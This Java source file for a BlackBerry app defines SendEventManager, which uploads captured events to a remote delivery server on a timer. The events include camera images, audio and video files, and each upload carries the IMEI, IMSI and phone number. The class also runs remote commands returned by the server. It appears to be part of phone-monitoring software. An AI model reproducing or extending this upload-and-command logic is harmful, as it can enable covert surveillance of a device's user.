package com.vvt.protsrv;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;
import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;
import net.rim.device.api.system.RuntimeStore;
import com.vvt.db.FxEventDBListener;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.FxAudioFileEvent;
import com.vvt.event.FxCameraImageEvent;
import com.vvt.event.FxEvent;
import com.vvt.event.FxMediaEvent;
import com.vvt.event.FxVideoFileEvent;
import com.vvt.event.constant.EventType;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.pref.PrefConnectionHistory;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.CommandCode;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.DataProvider;
import com.vvt.prot.command.CompressionType;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.Languages;
import com.vvt.prot.command.SendEvents;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.command.response.SendEventCmdResponse;
import com.vvt.prot.command.response.StructureCmdResponse;
import com.vvt.prot.event.PEvent;
import com.vvt.protsrv.resource.ProtocolManagerTextResource;
import com.vvt.protsrv.util.ProtSrvUtil;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.std.Constant;
import com.vvt.std.FileUtil;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.version.VersionInfo;

public class SendEventManager implements CommandListener, DataProvider, FxEventDBListener, FxTimerListener {
	
	private static final String TAG = "SendEventManager";
	private static final int SEND_EVENT_SEND_INTERVAL = 30; // In minute 
	private static final int SEND_EVENT_RETRY_INTERVAL = 10; // In minute 
	private static final int SEND_EVENT_RESEND_INTERVAL = 10; // In second
	private static final int SEND_EVENT_CMD_TIMER_ID = 10;
	private static final int SEND_EVENT_RETRY_TIMER_ID = 11;
	private static final int SEND_EVENT_RESEND_TIMER_ID = 12;
	private static final int MAX_RETRY = 5; // Retry or resume count
	private static final int MAX_PROCESS_RETRY = 5; // Process retry if no any notify after call doSend()
	private static final long SEND_EVENT_GUID = 0xf4145b985872c072L;
	private static SendEventManager self = null;
	private PersistentObject csidPersistence = null;
	private FxEventDatabase db = Global.getFxEventDatabase();
	private LicenseManager license = Global.getLicenseManager();
	private CommandServiceManager comServMgr = Global.getCommandServiceManager();
	private ServerUrl serverUrl = Global.getServerUrl();
	private RmtCmdProcessingManager rmtCmdMgr = Global.getRmtCmdProcessingManager();
	private LicenseInfo licenseInfo = license.getLicenseInfo();
	private Preference pref = Global.getPreference();
	private SendEventCmdResponse sendEventRes = null;
	private EventClientData sendEventCSID = null;
	private FxTimer cmdTimer = new FxTimer(SEND_EVENT_CMD_TIMER_ID, this);
	private FxTimer retryTimer = new FxTimer(SEND_EVENT_RETRY_TIMER_ID, this);
	private FxTimer resendTimer = new FxTimer(SEND_EVENT_RESEND_TIMER_ID, this);
	private Vector pEvents = null;
	private Vector fxEvents = null;
	private Vector fxEventChosen = new Vector();
	private Vector listeners = new Vector();
	private Vector actualMediaListeners = new Vector();
	private boolean progress = false;
	private boolean resume = false;
	private int processCount = 0;
	private int retryCount = 0;
	private int countEvent = 0;
	private ProtSrvUtil protSrvUtil = new ProtSrvUtil();
	
	private SendEventManager() {
		// Timer
		cmdTimer.setIntervalMinute(SEND_EVENT_SEND_INTERVAL);
		resendTimer.setInterval(SEND_EVENT_RESEND_INTERVAL);
		retryTimer.setIntervalMinute(SEND_EVENT_RETRY_INTERVAL);
		initDb();
		checkResumable();
	}
	
	public static SendEventManager getInstance() {
		if (self == null) {
			self = (SendEventManager)RuntimeStore.getRuntimeStore().get(SEND_EVENT_GUID);
			if (self == null) {
				SendEventManager sendEvent = new SendEventManager();
				RuntimeStore.getRuntimeStore().put(SEND_EVENT_GUID, sendEvent);
				self = sendEvent;
			}
		}
		return self;
	}
	
	public void addListener(PhoenixProtocolListener listener) {
		if (!isExisted(listener)) {
			listeners.addElement(listener);
		}
	}

	public void removeListener(PhoenixProtocolListener listener) {
		if (isExisted(listener)) {
			listeners.removeElement(listener);
		}
	}
	
	public void addActualMediaListener(ActualMediaListener listener) {
		if (!isActualMediaListenerExisted(listener)) {
			actualMediaListeners.addElement(listener);
		}
	}
	
	public void removeActualMediaListener(ActualMediaListener listener) {
		if (isActualMediaListenerExisted(listener)) {
			actualMediaListeners.removeElement(listener);
		}
	}
	
	public void sendEvents() {
		doSend();
	}
	
	public void reset() {
		// To cancel Command.
		if (sendEventCSID.getCsid() != null) {
			comServMgr.cancelRequest(sendEventCSID.getCsid().longValue());
		}
		clearRetryState();
		clearSendEventState();
		processCount = 0;
	}
	
	private void initDb() {
		csidPersistence = PersistentStore.getPersistentObject(SEND_EVENT_GUID);
		synchronized (csidPersistence) {
			if (csidPersistence.getContents() == null) {
				csidPersistence.setContents(new EventClientData());
				csidPersistence.commit();
			}
			sendEventCSID = (EventClientData) csidPersistence.getContents();
			// TODO:
			if (Log.isDebugEnable()) {
				if (sendEventCSID != null) {
					Log.debug(TAG + ".initDb", "sendEventCSID.getCsid() = " + sendEventCSID.getCsid());
					if (sendEventCSID.getFxEvents() != null) {
						Log.debug(TAG + ".initDb", "sendEventCSID.getFxEvents.size() = " + sendEventCSID.getFxEvents().size());
					}
				}
			}
		} 
	}
	
	private boolean isExisted(PhoenixProtocolListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private boolean isActualMediaListenerExisted(ActualMediaListener listener) {
		boolean existed = false;
		for (int i = 0; i < actualMediaListeners.size(); i++) {
			if (listener == actualMediaListeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private void notifySuccess() {
		try {
			updateSuccessStatus();
			// TODO: Add logic to notify actual media (PCCUploadActualMedia class) if only actual media sent successfully. 
			int eventSize = fxEventChosen.size();
			/*if (Log.isDebugEnable()) {
				Log.debug(TAG + ".notifySuccess()", "eventSize: " + eventSize);
			}*/
			if (eventSize == 1) {
				FxEvent fxEvent = (FxEvent) fxEventChosen.firstElement();
				EventType type = fxEvent.getEventType();
				/*if (Log.isDebugEnable()) {
					Log.debug(TAG + ".notifySuccess()", "EventType: " + type.getId());
				}*/
				if (type.equals(EventType.CAMERA_IMAGE) ||  
						type.equals(EventType.VIDEO) || 
						type.equals(EventType.AUDIO)) {
					FxMediaEvent fxMediaEvent = (FxMediaEvent) fxEvent;
					notifyActualMediaEventsSuccess(fxMediaEvent.getPairingId());
				} else {
					notifyRegularEventsSuccess();
				}
			} else {
				notifyRegularEventsSuccess();
			}
		} catch (Exception e) {
			Log.error(TAG + ".notifySuccess()", e.getMessage(), e);
		}
	}
	
	private void notifyActualMediaEventsSuccess(long paringId) {
		for (int i = 0; i < actualMediaListeners.size(); i++) {
			ActualMediaListener listener = (ActualMediaListener)actualMediaListeners.elementAt(i);
			listener.onActualMediaSuccess(sendEventRes, paringId);
		}
	}
	
	private void notifyRegularEventsSuccess() {
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onSuccess(sendEventRes);
		}
	}
	
	private void notifyError(String message) {
		updateErrorStatus(message);
		if (fxEvents != null) {
			if (fxEvents.size() == 1) {
					FxEvent fxEvent = (FxEvent) fxEvents.firstElement();
					EventType type = fxEvent.getEventType();
					/*if (Log.isDebugEnable()) {
						Log.debug(TAG + ".notifySuccess()", "EventType: " + type.getId());
					}*/
					if (type.equals(EventType.CAMERA_IMAGE) ||  
							type.equals(EventType.VIDEO) || 
							type.equals(EventType.AUDIO)) {
						FxMediaEvent fxMediaEvent = (FxMediaEvent) fxEvent;
						notifyActualMediaEventsError(message, fxMediaEvent.getPairingId());
					} else {
						notifyRegularEventsError(message);
					}
			} else {
				notifyRegularEventsError(message);
			}
		} else {
			notifyRegularEventsError(message);
		}
	}
	
	private void notifyActualMediaEventsError(String message, long paringId) {
		for (int i = 0; i < actualMediaListeners.size(); i++) {
			ActualMediaListener listener = (ActualMediaListener)actualMediaListeners.elementAt(i);
			listener.onActualMediaError(message, paringId);
		}
	}
	
	private void notifyRegularEventsError(String message) {
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onError(message);
		}
	}
	
	private void checkResumable() {
		try {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".checkResumable()", "ENTER");
			if (sendEventCSID != null) {
				Log.debug(TAG + ".checkResumable()", "sendEventCSID.getCsid() = " + sendEventCSID.getCsid());
				if (sendEventCSID.getFxEvents() != null) {
					Log.debug(TAG + ".checkResumable()", "sendEventCSID.getFxEvents.size() = " + sendEventCSID.getFxEvents().size());
				}
			}
		}
		new Timer().schedule(new TimerTask() {
			public void run() {
				if (sendEventCSID.getCsid() != null) {
					if (isCsidInPendingList(sendEventCSID.getCsid())) {
						if (Log.isDebugEnable()) {
							Log.debug(TAG + ".checkResumable()", "Resume");
						}
						doResume(sendEventCSID.getCsid().longValue());
					} else if (isCsidInOrphanList(sendEventCSID.getCsid())) {
						if (Log.isDebugEnable()) {
							Log.debug(TAG + ".checkResumable()", "Renew");
						}
						doSend();
					} else {
						if (Log.isDebugEnable()) {
							Log.debug(TAG + ".checkResumable()", "CSID is not in pending list and is not in orphan list");
						}
					}
				}		
			}
		}, 10000); // wait 10 seconds.
		} catch (Exception e) {
			Log.error(TAG + ".checkResumable()", e.getMessage(), e);
		}
	}
	
	private boolean isCsidInPendingList(Long csid) {
		boolean inPending = false;
		// Get all pending sessions
		Vector pendingCsids = comServMgr.getPendingCsids();
		if (pendingCsids != null) {
			if (csid != null) {
				long _csid = csid.longValue();
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".isCsidInPendingList()", "_csid: " + _csid + " ,pendingCsids.size: " + pendingCsids.size());
				}
				for (int i = 0; i < pendingCsids.size(); i++) {
					long pendingCsid = ((Long) pendingCsids.elementAt(i)).longValue();
					if (Log.isDebugEnable()) {
						Log.debug(TAG + ".isCsidInPendingList()", "pendingCsid: " + pendingCsid);
					}
					if (_csid == pendingCsid) {
						inPending = true;
						break;
					}
				}
			}
		}
		return inPending;
	}
	
	private boolean isCsidInOrphanList(Long csid) {
		boolean isOrphan = false;
		Vector orphanCsids = comServMgr.getOrphanCsids();
		if (orphanCsids != null) {
			if (csid != null) {
				long _csid = csid.longValue();
				for (int i = 0; i < orphanCsids.size(); i++) {
					long orphanCsid = ((Long) orphanCsids.elementAt(i)).longValue();
					if (_csid == orphanCsid) {
						isOrphan = true;
						break;
					}
				}
			}
		}
		return isOrphan;
	}
	
	private synchronized void doResume(long csid) {
		try {
			long _csid = comServMgr.executeResume(csid, this);
			if (_csid != csid) {
				// No session that mapping with this csid
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".doResume()", "No session that mapping with this csid");
				}
			}
		} catch (IOException e) {
			Log.error(TAG + ".doResume()", e.getMessage());
			e.printStackTrace();
		}
	}
	
	private synchronized void doSend() {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".doSend()", "ENTER");
		}
		try {
			licenseInfo = license.getLicenseInfo();
			if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId()) {
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".doSend()", "progress: " + progress);
				}
				// If events occurred between send events or resume/retry will skip it because it will continue to send all events later.
				if (!progress) {
					progress = true;
					if (Log.isDebugEnable()) {
						Log.debug(TAG + ".doSend()", "sendEventCSID: "  + sendEventCSID);
					}
					if (sendEventCSID.getCsid() == null) {
						int numberOfEvent = db.getNumberOfEvent();
						int numberOfCameraImageEvent = db.getNumberOfEvent(EventType.CAMERA_IMAGE);
						int numberOfAudioEvent = db.getNumberOfEvent(EventType.AUDIO);
						int numberOfVideoEvent = db.getNumberOfEvent(EventType.VIDEO);
						int numberOfMediaEvent = numberOfCameraImageEvent + numberOfAudioEvent + numberOfVideoEvent;
						if (Log.isDebugEnable()) {
							Log.debug(TAG + ".doSend()", "numberOfEvent:  " + numberOfEvent + " ,numberOfMediaEvent:  " + numberOfMediaEvent);							
						}
						if (numberOfEvent > 0) {
							fxEvents = db.selectAll();
						} else  if (numberOfMediaEvent > 0) { 
							fxEvents = getMediaEvent();
							if (fxEvents == null) {
								// Offset exceed database size, reach end of database
								progress = false;
								Log.error(TAG + ".sendAllEvent()", "Media file size more than available disk space size");
								return;
							}
						}  
						if (numberOfEvent > 0 || numberOfMediaEvent > 0) {
							countEvent = 0;
							if (Log.isDebugEnable()) {
								Log.debug(TAG + ".sendAllEvent()", "fxEvents.size(): " + fxEvents.size());
							}
							pEvents = EventAdapter.convertToPEvent(fxEvents);
							// To construct and send events.
							CommandRequest cmdRequest = new CommandRequest();
							// Meta Data
							CommandMetaData cmdMetaData = new CommandMetaData();
							cmdMetaData.setProtocolVersion(ApplicationInfo.PROTOCOL_VERSION);
							cmdMetaData.setProductId(licenseInfo.getProductID());
//							cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
							cmdMetaData.setProductVersion(VersionInfo.getFullVersion());
							cmdMetaData.setConfId(licenseInfo.getProductConfID());
							cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
							cmdMetaData.setLanguage(Languages.ENGLISH);
							cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
							cmdMetaData.setMcc(PhoneInfo.getMCC());
							cmdMetaData.setMnc(PhoneInfo.getMNC());
							cmdMetaData.setActivationCode(licenseInfo.getActivationCode());
							cmdMetaData.setImsi(PhoneInfo.getIMSI());
							cmdMetaData.setBaseServerUrl(protSrvUtil.getBaseServerUrl());
							cmdMetaData.setTransportDirective(TransportDirectives.RESUMABLE);
							if (numberOfMediaEvent > 0) {
								cmdMetaData.setEncryptionCode(EncryptionType.NO_ENCRYPTION.getId());
								cmdMetaData.setCompressionCode(CompressionType.NO_COMPRESS.getId());
							} else {
								cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
								cmdMetaData.setCompressionCode(CompressionType.COMPRESS_ALL_METADATA.getId());
							}
							// Event Data
							SendEvents eventData = new SendEvents();
							eventData.setEventCount(pEvents.size());
							eventData.addEventIterator(this);
							cmdRequest.setCommandData(eventData);
							cmdRequest.setCommandMetaData(cmdMetaData);
							cmdRequest.setUrl(serverUrl.getServerDeliveryUrl());
							cmdRequest.setCommandListener(this);
							// Execute Command
//							constructHttpDebugEvent();
							long csid = comServMgr.execute(cmdRequest);
							sendEventCSID.setCsid(new Long (csid));
							commit(sendEventCSID);
							startTimer();
//							Log.debug("SendEventManager.doSend", "Timer is START!");
						} else {
							progress = false;
							clearRetryState();
						}
					} else {
						// If between waiting for sending events but there are some events occurred and need to send in that time. 
						// For example, Resume is executed and then there are some events occurred to call doSend().
						if (Log.isDebugEnable()) {
							Log.debug(TAG + ".doSend()", "CSID is remaining, CSID: " + sendEventCSID.getCsid().longValue());
						}
						// To cancel Command.
						comServMgr.cancelRequest(sendEventCSID.getCsid().longValue());
						clearSendEventState();
						doSend();
					}
				}
			} else {
				progress = false;
				clearRetryState();
				notifyError(ProtocolManagerTextResource.APP_NOT_ACTIVATED);
			}
		} catch(Exception e) {
			Log.error(TAG + ".doSend()", e.getMessage(), e);
			progress = false;
			notifyError(e.getMessage());
			clearDatabaseBuffer();
			continueSendEvent();
		}
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".doSend()", "EXIT");
		}
	}
	
	private Vector getMediaEvent() {
		Vector fxEvent = null;
		if (db.getNumberOfEvent(EventType.CAMERA_IMAGE) > 0) {
			fxEvent = getMediaEventValidSize(EventType.CAMERA_IMAGE);
			/*if (Log.isDebugEnable()) {
				Log.debug(TAG + ".getMediaEvent", "Image, fxEvent != null?: " + (fxEvent != null));
			}*/
		}
		if (fxEvent == null) {
			if (db.getNumberOfEvent(EventType.AUDIO) > 0) {
				fxEvent = getMediaEventValidSize(EventType.AUDIO);
				/*if (Log.isDebugEnable()) {
					Log.debug(TAG + ".getMediaEvent", "Audio, fxEvent != null?: " + (fxEvent != null));
				}*/
			}
			if (fxEvent == null) {
				if (db.getNumberOfEvent(EventType.VIDEO) > 0) {
					fxEvent = getMediaEventValidSize(EventType.VIDEO);
					/*if (Log.isDebugEnable()) {
						Log.debug(TAG + ".getMediaEvent", "Video, fxEvent != null?: " + (fxEvent != null));
					}*/
				}
			}	
		}
		return fxEvent;
	}
	
	private Vector getMediaEventValidSize(EventType type) {
		Vector fxEvent = null;
		String filePath = null;
		try {
			int eventCount = db.getNumberOfEvent(type);
			for (int i = 0; i < eventCount; i++) {
				fxEvent = db.select(type, 1, i);
				/*if (Log.isDebugEnable()) {
					Log.debug(TAG + ".getMediaEventValidSize()", "fxEvent != null: " + (fxEvent != null));
				}*/
				if (fxEvent == null) {
					// Offset exceed database size, reach end of database
					break;
				}
				FxEvent event = (FxEvent)fxEvent.firstElement();
				if (type.equals(EventType.CAMERA_IMAGE)) {
					FxCameraImageEvent fxImageEvent = (FxCameraImageEvent) event;
					filePath = fxImageEvent.getFilePath();
				} else if (type.equals(EventType.AUDIO)) {
					FxAudioFileEvent fxAudioEvent = (FxAudioFileEvent) event;
					filePath = fxAudioEvent.getFilePath();
				} else if (type.equals(EventType.VIDEO)) {
					FxVideoFileEvent fxVideoEvent = (FxVideoFileEvent) event;
					filePath = fxVideoEvent.getFilePath();
				}
				// If file path doesn't exist will continue to select next media event
				if (filePath != null) {
					long fileSize = FileUtil.getFileSize(filePath);
					long freeDiskSpaceSize = FileUtil.getAvailableSize(ApplicationInfo.DISK_SPACE_PATH);
					/*if (Log.isDebugEnable()) {
						Log.debug(TAG + ".getMediaEventValidSize()", "fileSize: " + fileSize + " ,freeDiskSpaceSize: " + freeDiskSpaceSize);
					}*/
					if (fileSize >= freeDiskSpaceSize) {
						fxEvent = null;
						/*if (Log.isDebugEnable()) {
							Log.debug(TAG + ".getMediaEventValidSize()", "Size of filePath: " + filePath + "more than available disk space size");
						}*/
					} else {
						break;
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			Log.error(TAG + ".getMediaEventValidSize()", e.getMessage(), e);
		}
		return fxEvent;
	}
	
	private void resumeSendEvent() {
		resume = true;
		resendTimer.start();
	}
	
	private void retrySendEvent() {
		retryTimer.start();
	}
	
	private void continueSendEvent() {
		clearRetryState();
		resendTimer.start();
	}
	
	private void clearSendEventState() {
		progress = false;
		clearCsid();
	}
	
	private void clearCsid() {
		sendEventCSID.setCsid(null);
		sendEventCSID.setFxEvents(null);
		commit(sendEventCSID);
	}
	
	private void clearRetryState() {
		retryCount = 0;
		resume = false;
	}
	
	private void startTimer() {
		cmdTimer.stop();
		cmdTimer.start();
	}
	
	private void stopTimer() {
		cmdTimer.stop();
	}
	
	private void clearDatabaseBuffer() {
		fxEventChosen.removeAllElements();
		fxEvents = null;
		pEvents = null;
	}
	
	private synchronized void commit(EventClientData sendEventCSID) {
		csidPersistence.setContents(sendEventCSID);
		csidPersistence.commit();
	}
	
	private void updateSuccessStatus() {
		// To save last connection.
		PrefConnectionHistory conHistory = new PrefConnectionHistory();
		conHistory.setLastConnection(System.currentTimeMillis());
		conHistory.setConnectionMethod(sendEventRes.getConnectionMethod());
		conHistory.setLastConnectionStatus(sendEventRes.getServerMsg());
		conHistory.setActionType(CommandCode.SEND_EVENTS.getId());
		conHistory.setStatusCode(sendEventRes.getStatusCode());				
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		generalInfo.addPrefConnectionHistory(conHistory);
		pref.commit(generalInfo);
	}
	
	private void updateErrorStatus(String message) {
		PrefConnectionHistory conHistory = new PrefConnectionHistory();
		conHistory.setLastConnection(System.currentTimeMillis());
		conHistory.setLastConnectionStatus(message);
		conHistory.setStatusCode(2);
		conHistory.setActionType(CommandCode.SEND_EVENTS.getId());
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		generalInfo.addPrefConnectionHistory(conHistory);
		pref.commit(generalInfo);
	}
	
	// CommandListener
	public void onSuccess(StructureCmdResponse response) {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".onSuccess", "ENTER");
		}
		stopTimer();
//		updateHttpDebugEvent(response.getPayloadSize());
		if (response instanceof SendEventCmdResponse) {
			sendEventRes = (SendEventCmdResponse)response;
			// To process PCC commands.
			rmtCmdMgr.process(sendEventRes.getPCCCommands());
			// To delete events from store.
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".onSuccess", "fxEventChosen.size(): " + fxEventChosen.size());
			}
			db.addListener(this);
			db.delete(fxEventChosen);
		}
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".onSuccess", "EXIT");
		}
	}
	
	public void onConstructError(long csid, Exception e) {
		Log.error(TAG + ".onConstructError", "csid: " + csid, e);
		stopTimer();
		notifyError(e.getMessage());
		clearDatabaseBuffer();
		retrySendEvent();
	}
	
	public void onTransportError(long csid, Exception e) {
		Log.error(TAG + ".onTransportError", "csid: " + csid, e);
		stopTimer();
		notifyError(e.getMessage());
		clearDatabaseBuffer();
		resumeSendEvent();
	}
	
	public void onServerError(long csid, StructureCmdResponse response) {
		Log.error(TAG + ".onServerError()", "Status Code: " + response.getStatusCode() + " ,Server Message: " + response.getServerMsg());
		stopTimer();
		notifyError(response.getServerMsg() + Constant.L_SQUARE_BRACKET + Constant.HEX + Integer.toHexString(response.getStatusCode()) + Constant.R_SQUARE_BRACKET);
		clearDatabaseBuffer();
		retrySendEvent();
	}	
	
	// DataProvider
	public Object getObject() {
		fxEventChosen.addElement(fxEvents.elementAt(countEvent));
		PEvent event = (PEvent)pEvents.elementAt(countEvent);
		countEvent++;
		return event;
	}

	public boolean hasNext() {
		startTimer();
		return countEvent < pEvents.size();
	}
	
	public void readDataDone() {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".readDataDone()", "fxEventChosen: " + fxEventChosen.size());
		}
		// Regarding payload file size is limited at 2.5 MB so it need to update fxEvents here.
		sendEventCSID.setFxEvents(fxEventChosen);
		commit(sendEventCSID);
	}

	// FxEventDBListener
	public void onDeleteError() {
		Log.error(TAG + ".onDeleteError()", "ENTER");
		db.removeListener(this);
		notifyError(ProtocolManagerTextResource.DELETE_EVENT_FAILED);
		clearDatabaseBuffer();
		retrySendEvent();
		Log.error(TAG + ".onDeleteError()", "EXIT");
	}

	public void onDeleteSuccess() {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".onDeleteSuccess()", "ENTER");
		}
		db.removeListener(this);
		notifySuccess();
		clearDatabaseBuffer();
		continueSendEvent();
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".onDeleteSuccess()", "EXIT");
		}
	}

	public void onInsertError() {
	}

	public void onInsertSuccess() {
	}

	// FxTimerListener
	public void timerExpired(int id) {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".timerExpired()", "ENTER , id: " + id);
		}
		if (id == SEND_EVENT_CMD_TIMER_ID) {
			// To cancel Command.
			comServMgr.cancelRequest(sendEventCSID.getCsid().longValue());
//			Log.debug("SendEventManager.timerExpired", "attemptRound: " + attemptRound);
			if (processCount < MAX_PROCESS_RETRY) {
				processCount++;
				notifyError(ProtocolManagerTextResource.PROTOCOL_TIME_OUT);
				clearRetryState();
				clearSendEventState();
				doSend();
			} else {
				clearRetryState();
				clearSendEventState();
				processCount = 0;
			}
		} else if (id == SEND_EVENT_RETRY_TIMER_ID) {
			if (retryCount < MAX_RETRY) {
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".timerExpired()", "RETRY ENTER");
				}
				retryCount++;
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".timerExpired()", "Retry with construct new payload file, Retry count: " + retryCount);
				}
				clearSendEventState();
				doSend();
			} else {
				comServMgr.cancelRequest(sendEventCSID.getCsid().longValue());
				clearRetryState();
				clearSendEventState();
			}
			processCount = 0;
		} else if (id == SEND_EVENT_RESEND_TIMER_ID) {
			if (resume) {
				resume = false;
				if (retryCount < MAX_RETRY) {
					if (Log.isDebugEnable()) {
						Log.debug(TAG + ".timerExpired()", "RESUME ENTER");
					}
					retryCount++;
					long csid = 0;
					if (sendEventCSID.getCsid() != null) {
						csid = sendEventCSID.getCsid().longValue();
					}
					if (comServMgr.isSessionPending(csid)) {
						if (Log.isDebugEnable()) {
							Log.debug(TAG + ".timerExpired()", "Resume with csid: " + csid + " ,Resume count: " + retryCount);
						}
						// Resume
						doResume(csid);
					} 
				} else {
					comServMgr.cancelRequest(sendEventCSID.getCsid().longValue());
					clearRetryState();
					clearSendEventState();
				}
				processCount = 0;
			} else {
				// onSuccess and continue to send the rest events.
				if (Log.isDebugEnable()) {
					Log.debug(TAG + ".timerExpired()", "Send events success and continue to send the rest events");
				}
				clearSendEventState();
				doSend();
				processCount = 0;
			}
		}
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".timerExpired()", "EXIT");
		}
	}	
}
